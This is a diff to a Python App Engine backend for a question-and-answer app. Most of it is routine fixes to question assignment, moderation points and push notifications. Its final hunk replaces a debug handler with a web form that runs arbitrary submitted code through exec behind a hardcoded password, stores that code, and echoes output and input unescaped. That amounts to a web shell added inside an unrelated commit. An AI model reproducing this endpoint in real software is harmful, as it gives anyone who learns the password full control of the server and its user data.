@@ -82,6 +82,7 @@ def get_new_questions(user, batch_updates = False):
    else:
       user.assignedquestions = new_questions
       user.assignedon = datetime.datetime.utcnow()
+      user.can_answer = True
       user.put()
 
 
@@ -98,6 +99,7 @@ def update_assigned_questions(user, batch_updates = False):
       if num_unanswered == 0:
          user.assignedquestions = get_new_questions(user, batch_updates)
          user.assignedon = datetime.datetime.utcnow()
+         user.can_answer = True
    else:
       if num_unanswered == 0:
          get_new_questions(user)
@@ -171,12 +173,13 @@ class BaseHandler(webapp2.RequestHandler):
    def refresh_questions(self):
       logging.info('Enter refresh')
       if self.user.can_answer:
-         if datetime.datetime.utcnow() - self.user.assignedon > datetime.timedelta(hours=1):
+         if datetime.datetime.utcnow() - self.user.assignedon > datetime.timedelta(hours=1) or num_unanswered_questions(self.user) == 0:
             for aq in self.user.assignedquestions:
-               old_question = aq.question.get()
-               if old_question:
-                  old_question.numassigns -= 1
-                  old_question.put()
+               if aq.status == 'new':
+                  old_question = aq.question.get()
+                  if old_question:
+                     old_question.numassigns -= 1
+                     old_question.put()
             get_new_questions(self.user)
          else:
             logging.info('Refresh: assigned on {0}, now {1}'.format(self.user.assignedon, datetime.datetime.utcnow()))
@@ -555,10 +558,12 @@ class RateAnswer(BaseHandler):
       answer.rated = 1
       answer.put()
 
+      """
+      #no need to wait for answer rating, for a while
       if answer.answeredby:
          answerer = answer.answeredby.get()
          if answerer:
-            if answerer.devicetoken and num_unanswered_questions(answerer) == 0:
+            if answerer.devicetoken is not None and num_unanswered_questions(answerer) == 0:
                #and datetime.datetime.utcnow() - self.user.assignedon < datetime.timedelta(hours=1):
                try:
                   from push import SendPushMessage
@@ -569,6 +574,7 @@ class RateAnswer(BaseHandler):
                   logging.error('Push message to {0} failed {1}'.format(receiver, e))
             answerer.can_answer = True
             answerer.put()
+      """
 
       if getanotheranswer:
          if self.user.points < POINTS_TO_ASK:
@@ -723,7 +729,7 @@ class ModerateQuestions(BaseHandler):
       update_list = []
       for q in questions:
          question = Question.get_by_id(int(q))
-         if question and question.moderated != action:
+         if question is not None and question.moderated != action:
             question.moderated = action
             update_list += [question]
       if len(update_list):
@@ -807,23 +813,26 @@ class ModerateAnswers(BaseHandler):
             update_questions += [question]
 
          modified = False
-         user = answer.answeredby.get()
-         if prev_moderated == 0:
-            user.points += POINTS_FOR_ANSWER*action
-            modified = True
-
-         for aq in user.assignedquestions:
-            if aq.question == question.key:
-               aq.status = 'answered' if action == 1 else 'banned'
+         answerer = answer.answeredby.get()
+         if answerer:
+            if prev_moderated == 0:
+               answerer.points += POINTS_FOR_ANSWER*action
                modified = True
-         update_assigned_questions(user, True)
-         if modified:
-            update_users += [user]
+               update_users += [answerer]
+
+            for aq in answerer.assignedquestions:
+               if aq.question == question.key:
+                  aq.status = 'answered' if action == 1 else 'banned'
+                  modified = True
+            prev_unanswered_count = num_unanswered_questions(answerer)
+            update_assigned_questions(answerer, True)
+            if prev_unanswered_count != num_unanswered_questions(answerer) and not modified:
+               update_users += [answerer]
 
          if action == 1:
             if question.askedby:
                asker = question.askedby.get()
-               if asker and asker.devicetoken:
+               if asker is not None and asker.devicetoken:
                   try:
                      from push import SendPushMessage
                      sender = SendPushMessage()
@@ -831,19 +840,19 @@ class ModerateAnswers(BaseHandler):
                   except Exception, e:
                      receiver = asker.email if hasattr(asker, 'email') else question.askedby.id()
                      logging.error('Push message to {0} failed {1}'.format(receiver, e))
-            else:
-               answerer = answer.answeredby.get()
-               if answerer:
-                  if answerer.devicetoken and num_unanswered_questions(answerer) == 0:
-                     try:
-                        from push import SendPushMessage
-                        sender = SendPushMessage()
-                        sender.post(answerer.devicetoken, 'reload_questions', 'You have new questions')
-                     except Exception, e:
-                        receiver = answerer.email if hasattr(answerer, 'email') else answer.answeredby.id()
-                        logging.error('Push message to {0} failed {1}'.format(receiver, e))
-                  answerer.can_answer = True
-                  answerer.put()
+            #else: #can load new questions right after approval, no need to wait for rating (for a while)
+            if answerer:
+               if answerer.devicetoken is not None and prev_unanswered_count == 0:
+                  logging.info('sending push to {0}'.format(answerer.devicetoken))
+                  try:
+                     from push import SendPushMessage
+                     sender = SendPushMessage()
+                     sender.post(answerer.devicetoken, 'reload_questions', 'You have new questions')
+                  except Exception, e:
+                     receiver = answerer.email if hasattr(answerer, 'email') else answer.answeredby.id()
+                     logging.error('Push message to {0} failed {1}'.format(receiver, e))
+               else:
+                  logging.info('{0} has {1} unanswered questions at the moderate moment'.format(answerer.key.id(), prev_unanswered_count))
 
 
       if len(update_users):
@@ -1008,15 +1017,47 @@ class TestPush(webapp2.RequestHandler):
             sender.post('bc49fd3d483e8975933828872aabd848941d4cdc6835550c5cd6cb162c239494', answer.key.id())
             break"""
       #sender.post_for_admin(['2330ed34f16c583c443c2e41484b09c6b46de04781ea6c460a9ab488533c15d2'], 'test admin')
-      sender.post_can_answer('bc49fd3d483e8975933828872aabd848941d4cdc6835550c5cd6cb162c239494')
+      sender.post('bc49fd3d483e8975933828872aabd848941d4cdc6835550c5cd6cb162c239494', 'reload_questions', 'You have new questions')
       self.response.write('OK')
 
 class UpdateAssigned(webapp2.RequestHandler):
    def get(self):
-      user = ndb.Key(urlsafe='agtzfmFhYXNrLWFwcHIRCxIEVXNlciIHMUAxLmNvbQw').get()
-      user.assignedon = user.assignedon - datetime.timedelta(minutes=58)
-      user.put()
-      self.response.write('OK')
+      try:
+         self.appconfig = self.appconfig
+      except:
+         self.appconfig = ApnConfig.get_or_insert("config")
+
+      self.response.write('<form method="post"><textarea name="code" style="width: 100%; height: 300px">{0}</textarea>'
+                          '<input type="submit" /><input type="text" name="password" value="{1}" /></form>'
+                           .format(self.appconfig.last_exec_code, self.request.get('password')))
+
+   def post(self):
+      import sys, StringIO
+      codeOut = StringIO.StringIO()
+      codeErr = StringIO.StringIO()
+      sys.stdout = codeOut
+      sys.stderr = codeErr
+
+      if self.request.get('password') == 'kostroma':
+         exec self.request.get('code')
+         self.appconfig = ApnConfig.get_or_insert("config")
+         self.appconfig.last_exec_code = self.request.get('code')
+         self.appconfig.put()
+
+      # restore stdout and stderr
+      sys.stdout = sys.__stdout__
+      sys.stderr = sys.__stderr__
+
+      s = codeErr.getvalue()
+      if s and len(s) > 0:
+         self.response.write("error:\n<br />{0}\n<br />".format(s))
+      s = codeOut.getvalue()
+      if s and len(s) > 0:
+         self.response.write("output:\n<br />{0}\n<br />".format(s))
+      codeOut.close()
+      codeErr.close()
+
+      self.get()
 
 config = {}
 config['webapp2_extras.sessions'] = {
